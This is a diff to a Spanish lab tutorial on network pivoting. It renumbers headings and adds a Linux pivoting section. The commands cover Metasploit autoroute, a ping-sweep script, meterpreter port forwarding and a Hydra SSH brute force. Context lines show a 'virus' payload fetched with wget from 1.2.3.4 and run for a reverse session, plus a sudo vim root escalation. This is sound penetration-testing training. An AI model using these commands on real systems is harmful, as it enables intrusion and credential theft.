@@ -85,7 +85,7 @@ Esto asegura que Metasploitable2 estará en la misma red NAT que la máquina Win
   * **Contraseña**: `msfadmin`
 * Ejecuta `ifconfig` y asegúrate de que solo haya **una interfaz de red** conectada a la red NAT.
 
-### 7- Infiltración en la Máquina Windows7 y Pivoting
+### 7. Infiltración en la Máquina Windows7 y Pivoting
 
 Para identificar las máquinas en la red local:
 
@@ -175,7 +175,7 @@ Abrimos el navegador con la IP de la máquina Windows 7 con el puerto 5000 porqu
 
 <figure><img src="../../.gitbook/assets/Captura de pantalla 2024-11-06 163901.png" alt=""><figcaption></figcaption></figure>
 
-### Configuración de Red en VirtualBox
+### 1. Configuración de Red en VirtualBox
 
 Para crear una red en VirtualBox y configurar las máquinas necesarias, sigue estos pasos:
 
@@ -193,7 +193,7 @@ Para crear una red en VirtualBox y configurar las máquinas necesarias, sigue es
 3. **Iniciar Máquinas**:
    * Con las configuraciones completadas, inicia las máquinas en el orden necesario.
 
-### Detección y Exploración de Vulnerabilidades
+### 2. Detección y Exploración de Vulnerabilidades
 
 #### Paso 1: Identificación de la Máquina Objetivo
 
@@ -213,7 +213,7 @@ nmap -p- -sS -sC -sV --open --min-rate=5000 -vvv -n -Pn <IP máquina víctima>
 
 En los resultados, se observa que los puertos **80** y **21** están abiertos.
 
-### Acceso a la Máquina Vulnerable
+### 3. Acceso a la Máquina Vulnerable
 
 #### Paso 1: Exploración del Servicio FTP
 
@@ -251,7 +251,7 @@ Para activar el payload y obtener acceso, visita la siguiente URL:
 http://<IP máquina víctima>/pwned.php
 ```
 
-### Estabilización de la Conexión y Creación de Payload para Meterpreter
+### 4. Estabilización de la Conexión y Creación de Payload para Meterpreter
 
 #### Paso 1: Estabilización de la Conexión
 
@@ -291,7 +291,7 @@ Desde la sesión activa en la máquina víctima, descarga el payload usando `wge
 wget http://1.2.3.4/virus
 ```
 
-### Configuración de Metasploit para Recibir la Sesión
+### 5. Configuración de Metasploit para Recibir la Sesión
 
 #### Paso 1: Iniciar el Handler en Metasploit
 
@@ -333,7 +333,7 @@ Inicia el handler para recibir la sesión:
 run
 ```
 
-### Ejecución del Payload en la Máquina Víctima
+### 6. Ejecución del Payload en la Máquina Víctima
 
 #### Paso 1: Asignar Permisos de Ejecución
 
@@ -351,7 +351,7 @@ Inicia la ejecución del archivo para enviar la sesión a Metasploit:
 ./virus
 ```
 
-### Escalada de Privilegios
+### 7. Escalada de Privilegios
 
 Para realizar pivoting, necesitamos obtener privilegios de **root** ya que como usuarios `www-data` tenemos permisos limitados.
 
@@ -377,10 +377,158 @@ Consultando **GTFOBins**, encontramos el comando para escalar privilegios utiliz
 sudo vim -c ':!/bin/sh'
 ```
 
-### Finalización del Pivoting
+### 8. Finalización del Pivoting
 
 Con la sesión de **root** obtenida, podemos completar el proceso de pivoting ejecutando el payload en la máquina intermedia:
 
 ```bash
 ./virus
+```
+
+## Pivoting en Entornos Linux
+
+### 1. Identificar las Interfaces de Red
+
+Desde el intérprete de **Meterpreter** en la máquina intermedia **Friendly**, listamos las interfaces de red para visualizar la red interna:
+
+```bash
+ipconfig
+```
+
+Observaremos dos interfaces de red:
+
+* **Friendly**: máquina intermedia.
+* **Basic**: la máquina final en la red interna.
+
+### 2. Poner en Segundo Plano la Sesión de Meterpreter
+
+Para escanear otros dispositivos en la red, enviamos la sesión actual de **Meterpreter** a segundo plano:
+
+* Usar `Ctrl + Z` para minimizar la sesión.
+*   Confirmar que la sesión sigue activa con:
+
+    ```bash
+    sessions -l
+    ```
+
+### 3. Añadir Rutas y Configurar Enrutamiento
+
+Configuramos el enrutamiento para escanear la red interna cargando el módulo `autoroute` en Metasploit:
+
+```bash
+use multi/manage/autoroute
+```
+
+*   Asigna el **SESSION ID** adecuado (en este caso, `1`):
+
+    ```bash
+    set SESSION 1
+    ```
+*   Ejecuta el módulo:
+
+    ```bash
+    run
+    ```
+*   Verifica el enrutamiento configurado:
+
+    ```bash
+    route
+    ```
+
+### 4. Crear un Script de Escaneo de Red en Bash
+
+Para identificar otros dispositivos en la red interna, creamos un script en **bash**. En tu máquina local, crea el archivo:
+
+```bash
+nano escaner.sh
+```
+
+Incluye el siguiente contenido en el script:
+
+```bash
+#!/bin/bash
+
+for i in {1..255}; do
+  timeout 1 bash -c "ping -c 1 10.0.10.$i" >/dev/null
+  if [ $? -eq 0 ]; then
+    echo "El host 10.0.10.$i está activo"
+  fi
+done
+```
+
+Este script envía un **ping** a las IPs en el rango `10.0.10.1 - 10.0.10.255` para identificar hosts activos.
+
+### 5. Transferir el Script a la Máquina Intermedia
+
+Para transferir el script a la máquina intermedia:
+
+1.  Inicia un servidor HTTP en tu máquina:
+
+    ```bash
+    python3 -m http.server 80
+    ```
+2.  Desde la sesión de Meterpreter, descarga el script en **Friendly**:
+
+    ```bash
+    wget <IP del servidor>/escaner.sh
+    ```
+3.  Verifica que el archivo se transfirió correctamente:
+
+    ```bash
+    ls
+    ```
+4.  Asigna permisos de ejecución al archivo:
+
+    ```bash
+    chmod +x escaner.sh
+    ```
+5.  Ejecuta el script para ver los hosts activos en la red interna:
+
+    ```bash
+    ./escaner.sh
+    ```
+
+### 6. Escaneo de Puertos con Metasploit
+
+En **Metasploit**, usa el módulo de escaneo de puertos TCP para analizar la IP identificada.
+
+```bash
+use scanner/portscan/tcp
+set RHOSTS <IP máquina víctima>
+run
+```
+
+Este módulo muestra los puertos abiertos en la máquina objetivo.
+
+### 7. Redirección de Puertos (Port Forwarding)
+
+Para acceder a los servicios en la máquina víctima, redirigimos sus puertos hacia nuestro equipo local.
+
+Ejemplo de redirección para **SSH** en el puerto `22` hacia el puerto `222` en tu máquina:
+
+```bash
+session -i 1
+portfwd add -l 222 -p 22 -r <IP máquina víctima>
+```
+
+Conéctate al servicio SSH desde tu terminal local:
+
+```bash
+ssh dimitri@127.0.0.1 -p 222
+```
+
+Si necesitas redirigir otro puerto, como el `631`, puedes mapearlo al puerto `5000` en tu equipo:
+
+```bash
+portfwd add -l 5000 -p 631 -r 1.1.1.8
+```
+
+Ahora puedes acceder al servicio en tu navegador en `127.0.0.1:5000`.
+
+### 8. Ataque de Fuerza Bruta con Hydra
+
+Para realizar un ataque de fuerza bruta en el servicio SSH, utiliza **Hydra**:
+
+```bash
+hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
 ```
